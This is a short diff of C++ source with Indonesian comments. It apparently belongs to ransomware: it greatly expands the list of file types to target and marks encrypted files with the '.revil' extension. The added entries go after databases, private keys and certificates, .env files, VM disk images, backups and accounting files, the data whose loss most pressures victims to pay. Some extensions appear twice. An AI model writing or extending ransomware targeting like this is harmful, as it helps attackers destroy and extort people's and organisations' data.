@@ -68,10 +68,14 @@ namespace fs = std::filesystem;
 
 // ====================== KONFIGURASI LAIN ======================
 const std::vector<std::string> TARGET_EXTENSIONS = {
-    ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
-    ".jpg", ".jpeg", ".png", ".gif", ".mp4", ".mov", ".avi",
-    ".sql", ".db", ".cpp", ".h", ".py", ".js", ".ts",
-    ".csv", ".zip", ".rar", ".7z", ".md"
+    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".rtf", ".odt", ".txt", ".csv",
+    ".db", ".sql", ".mdb", ".accdb", ".sqlite", ".mdf", ".ldf", ".ora", ".dbf",
+    ".psd", ".ai", ".dwg", ".dxf", ".svg", ".raw", ".jpg", ".png", ".gif", ".mp4", ".mov", ".avi", ".mkv",
+    ".cpp", ".h", ".c", ".cs", ".java", ".py", ".js", ".ts", ".php", ".html", ".css", ".go", ".rs", ".swift",
+    ".json", ".yaml", ".xml", ".conf", ".ini", ".env", ".key", ".pem", ".crt", ".p12", ".pfx",
+    ".rb", ".erb", ".mp3", ".tsx", ".mjs", ".bmp", ".wav", ".mov", "backup.*", ".3gp",
+    ".zip", ".rar", ".7z", ".tar", ".gz", ".iso", ".vmdk", ".vhd", ".bak",
+    ".qbb", ".qbw", ".tax", ".myo", ".pfx", ".crt", ".img", ".qcow"
 };
 
 const std::vector<std::string> ENCRYPTED_EXTENSIONS = { ".revil" };
